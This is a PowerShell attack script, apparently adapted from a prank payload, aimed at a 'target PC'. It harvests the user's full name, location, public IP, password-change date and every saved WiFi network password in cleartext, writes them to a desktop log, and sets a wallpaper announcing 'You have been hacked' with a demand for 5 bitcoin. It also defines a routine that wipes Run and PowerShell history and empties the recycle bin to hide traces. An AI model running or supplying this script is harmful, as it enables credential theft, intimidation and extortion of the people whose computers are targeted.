Write-Host "Hello from the web!"
<#
.DESCRIPTION
    This program gathers details from target PC to include name associated with the microsoft account, their latitude and longitude,
    Public IP, and    and the SSID and WiFi password of any current or previously connected to networks.
    It will take the gathered information and generate a .jpg with that information on show
    Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned
    Additionally a secret message will be left in the binary of the wallpaper image generated and left on their desktop
#>
#############################################################################################################################################

# this is the message that will be coded into the image you use as the wallpaper

$hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"  # Original message - Leaving this here, but not used in the image.

# this will be the name of the image you use as the wallpaper

$ImageName = "dont-be-suspicious"

# This will be the name of the log file
$logFileName = "gathered_info.log"
$desktopPath = [Environment]::GetFolderPath("Desktop")
$logFilePath = Join-Path $desktopPath $logFileName

#############################################################################################################################################

<#

.NOTES
    This will get the name associated with the microsoft account
#>

function Get-Name {
    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name";
        $fullName = ("$fullName").TrimStart("Full Name")
    }
    # If no name is detected function will return $null to avoid sapi speak
    # Write Error is just for troubleshooting
    catch {
        Write-Error "No name was detected"
        return $env:UserName -ErrorAction SilentlyContinue
    }
    return $fullName
}

$fn = Get-Name
"Hey $fn" | Out-File -Path $logFilePath
"`nYour computer is not very secure" | Out-File -Path $logFilePath -Append

#############################################################################################################################################

<#

.NOTES
    This is to get the current Latitide and Longitude of your target
#>

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
        $GeoWatcher.Start() #Begin resolving current locaton

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100 #Wait for discovery.
        }

        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoWatcher.Position.Location | Select Latitude, Longitude #Select the relevent results.
        }
    }
    # Write Error is just for troubleshooting
    catch {
        Write-Error "No coordinates found"
        return "No Coordinates found" -ErrorAction SilentlyContinue
    }
}

$GL = Get-GeoLocation
if ($GL) {
    "`nYour Location: `n$GL" | Out-File -Path $logFilePath -Append
}

#############################################################################################################################################

<#

.NOTES
    This will get the public IP from the target computer
#>

function Get-PubIP {
    try {
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    }
    # If no Public IP is detected function will return $null to avoid sapi speak
    # Write Error is just for troubleshooting
    catch {
        Write-Error "No Public IP was detected"
        return $null -ErrorAction SilentlyContinue
    }
    return $computerPubIP
}

$PubIP = Get-PubIP
if ($PubIP) {
    "`nYour Public IP: $PubIP" | Out-File -Path $logFilePath -Append
}

###########################################################################################################

<#

.NOTES
    Password last Set
    This function will custom tailor a response based on how long it has been since they last changed their password
#>

function Get-Days_Set {
    #-----VARIABLES-----#
    # $pls (password last set) = the date/time their password was last changed
    # $days = the number of days since their password was last changed

    try {
        $pls = net user $env:USERNAME | Select-String -Pattern "Password last";
        $pls = [string]$pls
        $plsPOS = $pls.IndexOf("e")
        $pls = $pls.Substring($plsPOS + 2).Trim()
        $pls = $pls -replace ".{3}$"
        $time = ((Get-Date) - (Get-Date "$pls"));
        $time = [string]$time
        $DateArray = $time.Split(".")
        $days = [int]$DateArray[0]
        return $pls
    }
    # If no password set date is detected funtion will return $null to cancel Sapi Speak
    # Write Error is just for troubleshooting
    catch {
        Write-Error "Day password set not found"
        return $null -ErrorAction SilentlyContinue
    }
}

$pls = Get-Days_Set
if ($pls) {
    "`nPassword Last Set: $pls" | Out-File -Path $logFilePath -Append
}

###########################################################################################################

<#

.NOTES
    All Wifi Networks and Passwords
    This function will gather all current Networks and Passwords saved on the target computer
    They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
#>

# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress

# Get Wifi SSIDs and Passwords
$WLANProfileNames = @()

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach ($WLANProfileName in $Output) {
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects = @()

#Bind the WLAN profile names and also the password to a custom object
Foreach ($WLANProfileName in $WLANProfileNames) {
    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try {
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    } catch {
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}

if ($WLANProfileObjects) {
    "`nW-Lan profiles: ===============================" | Out-File -Path $logFilePath -Append
    $WLANProfileObjects | Out-File -Path $logFilePath -Append
}

#############################################################################################################################################

<#

.NOTES
    This will get the dimension of the targets screen to make the wallpaper
#>

Add-Type -AssemblyName System.Drawing # Keep this, it is needed to create the image.

$hdc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

#############################################################################################################################################

<#

.NOTES
    This will get take the information gathered and format it into a .jpg
#>

Add-Type -AssemblyName System.Drawing # Keep this, it is needed to create the image.

$tempImagePath = "$env:tmp\foo.jpg"
$finalImagePath = Join-Path $desktopPath "$ImageName.jpg"
$font = New-Object System.Drawing.Font Consolas, 18
$brushBg = [System.Drawing.Brushes]::Black
$brushFg = [System.Drawing.Brushes]::White
$bmp = New-Object System.Drawing.Bitmap $hdc, $h
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.FillRectangle($brushBg, 0, 0, $bmp.Width, $bmp.Height)

# Construct the message with gathered information:
$content = "Your have been hacked`n" +
           "##################################`n" +
           "IP Address: $($PubIP)`n" +
           "##################################`n" +
           "User: $($fn)`n" +
           "##################################`n" +
           "Your comouter is not safe please pay 5 bitcoin to me or i will delete"

$graphics.DrawString($content, $font, $brushFg, 10, 10) # Adjusted position to 10,10
$graphics.Dispose()
$bmp.Save($tempImagePath)

# Invoke-Item $filename

#############################################################################################################################################

<#

.NOTES
    This will take your hidden message and use steganography to hide it in the image you use as the wallpaper
    Then it will clean up the files you don't want to leave behind
#>

$hiddenMessage | Out-File -Path "$Env:temp\hidden.txt"
cmd.exe /c copy /b "$tempImagePath" + "$Env:temp\hidden.txt" "$finalImagePath"

rm $env:TEMP\foo.jpg,$Env:temp\hidden.txt -Force -ErrorAction SilentlyContinue

#############################################################################################################################################

<#

.NOTES
    This will take the image you generated and set it as the targets wall paper
#>

Function Set-WallPaper {

<#

    .SYNOPSIS
    Applies a specified wallpaper to the current user's desktop

    .PARAMETER Image
    Provide the exact path to the image

    .PARAMETER Style
    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)

    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit

#>

    param (
        [parameter(Mandatory = $True)]
        # Provide path to image
        [string]$Image,
        # Provide wallpaper style that you would like applied
        [parameter(Mandatory = $False)]
        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
        [string]$Style
    )

    $WallpaperStyle = Switch ($Style) {
        "Fill"    { "10" }
        "Fit"     { "6" }
        "Stretch" { "2" }
        "Tile"    { "0" }
        "Center"  { "0" }
        "Span"    { "22" }
    }

    If ($Style -eq "Tile") {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
    } Else {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
    }

    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Params
{
    [DllImport("User32.dll",CharSet=CharSet.Unicode)]
    public static extern int SystemParametersInfo (Int32 uAction,
                                                 Int32 uParam,
                                                 String lpvParam,
                                                 Int32 fuWinIni);
}
"@

    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02

    $fWinIni = $UpdateIniFile -bor $SendChangeEvent

    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

#----------------------------------------------------------------------------------------------------

function clean-exfil {

<#

.NOTES
    This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder

# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue # Commented out to keep temp files for now

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

#----------------------------------------------------------------------------------------------------

Set-WallPaper -Image "$finalImagePath" -Style Center

# We are not calling clean-exfil so the files will remain on the desktop.
# clean-exfil
